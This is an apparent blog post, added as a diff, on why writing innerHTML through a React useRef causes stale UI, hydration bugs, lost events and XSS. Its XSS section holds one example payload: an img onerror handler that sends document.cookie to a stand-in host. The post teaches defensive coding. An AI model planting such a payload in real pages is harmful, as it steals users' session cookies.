@@ -1,0 +1,235 @@
+---
+title: Why you should not use innerHTML from a React useRef
+description: Assigning innerHTML through a ref skips React’s render path, opens XSS holes, breaks hydration, and leaves stale UI. What to do instead.
+slug: react-innerhtml-useref
+date: 2026-09-01
+tags:
+  - react
+  - javascript
+  - browser
+  - interview
+subject: react
+---
+
+You will see this pattern in legacy jQuery code, in quick Stack Overflow answers, and sometimes in a React codebase that is “almost done”:
+
+```tsx
+function Widget({ html }: { html: string }) {
+  const rootRef = useRef<HTMLDivElement>(null);
+
+  useEffect(() => {
+    if (rootRef.current) {
+      rootRef.current.innerHTML = html;
+    }
+  }, [html]);
+
+  return <div ref={rootRef} />;
+}
+```
+
+It works once. Then someone ships user-generated content, turns on SSR, or wonders why a theme toggle does not repaint that box — and the bugs start.
+
+**`useRef` is fine. `innerHTML` through a ref is the problem.** A ref should point at a node React already rendered. Writing HTML strings into that node tells React “I will manage this subtree myself,” which fights everything React is doing above it.
+
+## What useRef is for
+
+A <Term id="react-hook">hook</Term> like `useRef` gives you a stable box (`ref.current`) that survives re-renders **without** triggering one when you mutate it. React’s docs and this site’s [React Hooks note](/blog/react-hooks) list the good cases:
+
+- **DOM handles** — `inputRef.current?.focus()`, measure height, scroll into view
+- **Imperative APIs** — `video.play()`, map libraries, chart canvases
+- **Values that are not UI** — timer ids, abort controllers, “latest callback” refs
+
+Those uses **read or call** the node. They do not replace React’s children with a new HTML tree every time props change.
+
+## You leave React’s render path
+
+React’s model is declarative: `props` and `state` go in, a virtual tree comes out, the reconciler diffs it against the last tree, and the DOM updates.
+
+When you set `ref.current.innerHTML = …`:
+
+1. React renders `<div ref={rootRef} />` (often empty).
+2. Your Effect runs **after** paint and injects markup.
+3. On the next render, React still thinks the div is empty. It does not diff your injected nodes.
+4. If React ever re-creates that DOM node (key change, parent remount, route swap), your HTML is gone until the Effect runs again — users may see a flash.
+
+So you have **two owners** for one element: React (the outer shell) and your Effect (the inner HTML). They do not coordinate.
+
+### The stale UI bug
+
+```tsx
+function Preview({ markdown, theme }: { markdown: string; theme: "light" | "dark" }) {
+  const ref = useRef<HTMLDivElement>(null);
+
+  useEffect(() => {
+    if (!ref.current) return;
+    ref.current.innerHTML = renderMarkdown(markdown); // ignores theme
+  }, [markdown]);
+
+  return <div ref={ref} className={theme === "dark" ? "prose-invert" : ""} />;
+}
+```
+
+`theme` changes re-render the component and update the `className`, but the **inner** markup was built for the old theme and never rebuilt. With normal JSX, children re-render when any dependency changes. With `innerHTML`, only what you listed in the Effect dependency array updates — everything else drifts.
+
+## Security: XSS
+
+`innerHTML` parses a string as HTML. If that string includes `<script>`, inline handlers, or `javascript:` URLs, the browser may execute or expose them (exact rules depend on context and CSP, but the foot-gun is real).
+
+```tsx
+// user comment: Hello <img src=x onerror="fetch('https://evil.test?c='+document.cookie)">
+ref.current.innerHTML = userComment;
+```
+
+React’s default JSX escapes text:
+
+```tsx
+<div>{userComment}</div> // shown as text, not parsed as tags
+```
+
+The supported escape hatch is `dangerouslySetInnerHTML` — the name is intentional. It still does not sanitize; it only makes the risk visible in code review. **Putting the same string through a ref’s `innerHTML` is the same risk with worse ergonomics** — no lint rule, no obvious red flag in the JSX tree.
+
+Rule: **never** pipe untrusted HTML into `innerHTML` (ref or not) without a vetted sanitizer (e.g. DOMPurify) and a tight Content-Security-Policy.
+
+## Hydration and reconciliation
+
+On the server, React renders:
+
+```html
+<div></div>
+```
+
+Your client Effect then fills:
+
+```html
+<div><p>Hello</p></div>
+```
+
+During <Term id="hydration">hydration</Term>, React compares server HTML to the first client render. If the client render is still empty but the browser already shows content (or the opposite), you get hydration warnings and React may discard server markup.
+
+Even in a client-only SPA, mixing strategies causes odd bugs: React 18 Strict Mode runs Effects twice in development. Your Effect may append or replace twice unless you guard carefully — easy to miss when you are not using React state.
+
+## You lose React’s event system
+
+Handlers attached with `onClick={…}` live in React’s synthetic event layer. Nodes created via `innerHTML` are **inert** to that system unless you:
+
+- Re-bind with `addEventListener` yourself (and remember cleanup), or
+- Use event delegation on a parent (still manual)
+
+```tsx
+ref.current.innerHTML = `<button id="save">Save</button>`;
+document.getElementById("save")?.addEventListener("click", save); // leaks, duplicates in Strict Mode
+```
+
+Compare with:
+
+```tsx
+<button type="button" onClick={save}>Save</button>
+```
+
+One source of truth, automatic cleanup on unmount, accessible by default.
+
+## What about dangerouslySetInnerHTML?
+
+It is still “HTML as a string,” but it stays **inside** React’s render:
+
+```tsx
+function Safeish({ html }: { html: string }) {
+  const clean = DOMPurify.sanitize(html);
+  return <div className="prose" dangerouslySetInnerHTML={{ __html: clean }} />;
+}
+```
+
+Pros over ref + `innerHTML`:
+
+- Updates when props change — same render pass as the rest of the tree
+- Visible in the component output — reviewers see the risk
+- Works with SSR if server and client pass the same sanitized string
+
+Cons remain: you must sanitize, you cannot compose arbitrary React children inside that HTML, and complex interactive content still belongs in JSX.
+
+Use `dangerouslySetInnerHTML` only for trusted or sanitized blobs (CMS HTML, highlighted code from a server you control). Prefer a React renderer (`react-markdown`, MDX, a component per block type) when you can.
+
+## When imperative DOM is still OK
+
+Refs are not banned — **unmanaged inner HTML** is.
+
+| OK with `ref` | Avoid `ref.current.innerHTML` |
+| --- | --- |
+| `ref.current.focus()` | Building UI from strings |
+| `ref.current.scrollIntoView()` | User-generated markup |
+| Passing a container to `new Chart(ref.current)` | “Quick” templating |
+| Measuring `getBoundingClientRect()` | Re-running jQuery plugins on every prop change |
+
+Third-party widgets that demand a DOM node are the classic exception. Mount them in an Effect, pass `ref.current`, and **destroy** on cleanup:
+
+```tsx
+useEffect(() => {
+  const el = ref.current;
+  if (!el) return;
+  const map = L.map(el).setView([51.5, -0.1], 13);
+  return () => map.remove();
+}, []);
+```
+
+The library paints inside the container; you do not assign arbitrary HTML strings on every render.
+
+## Better patterns
+
+### Render data as JSX
+
+```tsx
+function Comment({ author, body }: { author: string; body: string }) {
+  return (
+    <article>
+      <p className="font-semibold">{author}</p>
+      <p>{body}</p>
+    </article>
+  );
+}
+```
+
+### Markdown / rich text
+
+- **`react-markdown`** with custom components — maps AST nodes to React elements
+- **MDX** — markdown files that compile to components (how this site’s blog works)
+- **Structured CMS fields** — title, body blocks, code — each block is a component
+
+### HTML from an API you must display
+
+1. Sanitize on the server or client (allow-list tags/attributes).
+2. Prefer `dangerouslySetInnerHTML` with the sanitized string in render, not an Effect.
+3. Lock down CSP (`script-src`, no inline handlers).
+
+### Truly dynamic third-party HTML (embeds)
+
+Use an iframe with `sandbox`, or a vendor React SDK, not `innerHTML` in your app shell.
+
+## Smell test in code review
+
+Reject the PR if you see:
+
+- `ref.current.innerHTML =` (or `outerHTML`, `insertAdjacentHTML`) in a React component
+- Effects whose only job is to “sync” HTML whenever props change — that is a render
+- `document.getElementById` / `querySelector` inside components for UI that React should own
+
+Ask: **can this be JSX, or a small child component, or a vetted library?** If yes, do that.
+
+## Interview cheat sheet
+
+**Why not `innerHTML` + `useRef`?**  
+You bypass React’s declarative updates, risk XSS, break hydration, lose synthetic events, and create two owners for one DOM subtree. Effects run after paint, so content can flash or go stale when props change.
+
+**When is `useRef` appropriate?**  
+Stable handles: DOM focus/measure, imperative widget instances, timers, latest callback — not for painting UI from strings.
+
+**`dangerouslySetInnerHTML` vs ref `innerHTML`?**  
+Both parse HTML strings. The prop keeps updates in render, is easier to audit, and composes with SSR if the string matches. Still requires sanitization for untrusted input.
+
+**How do you show markdown?**  
+Parse to an AST and map to React components (`react-markdown`, MDX), not `innerHTML`.
+
+## Related reading
+
+- [React Hooks, by version](/blog/react-hooks) — `useRef` use cases
+- [What is hydration?](/blog/hydration) — why server and client markup must match
+- [What is a stale closure?](/blog/stale-closure) — another way Effects drift from render
